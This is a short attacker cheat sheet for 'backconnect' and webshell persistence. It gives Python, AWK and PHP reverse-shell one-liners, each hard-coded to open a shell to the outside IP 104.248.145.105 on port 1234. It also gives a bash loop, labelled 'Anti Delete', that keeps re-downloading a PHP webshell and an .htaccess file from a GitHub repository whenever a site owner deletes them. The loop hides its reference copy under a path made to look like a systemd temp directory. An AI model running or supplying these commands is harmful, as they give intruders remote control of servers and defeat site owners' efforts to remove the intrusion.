# Trick BackConnect Bypass
## Python 
```
export RHOST="104.248.145.105";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```
## AWK 
```
awk 'BEGIN {s = "/inet/tcp/0/104.248.145.105/1234"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## PHP EXEC & PHP SHELL EXEC
[EXEC] 
```
php -r '$sock=fsockopen("104.248.145.105",1234);exec("sh <&3 >&3 2>&3");'
```
[SHELL_EXEC] 
```
php -r '$sock=fsockopen("104.248.145.105",1234);shell_exec("sh <&3 >&3 2>&3");'
```

# Tips & Trick Bypass Webshell / Crack Other Things / Defender Stuff
### Anti Delete Command : 
```
while true; do echo $(TZ=Asia/Jakarta date) && if [ ! -f ac.php ]; then curl -o ac.php https://raw.githubusercontent.com/t101804/repshare/main/ac.php; fi && if ! cmp --silent .htaccess /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a; then curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o .htaccess; fi && echo $(TZ=Asia/Jakarta date) && sleep 3; done
```
#### Script
```
#!/bin/bash

while true; do 
    echo $(TZ=Asia/Jakarta date)
    if [ ! -f ac.php ]; then curl -o ac.php https://raw.githubusercontent.com/t101804/repshare/main/ac.php; fi
    ! cmp --silent .htaccess /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a && curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o .htaccess
    echo $(TZ=Asia/Jakarta date)
    sleep 2
done
```


Credit by revshells.com and @CallMeRep
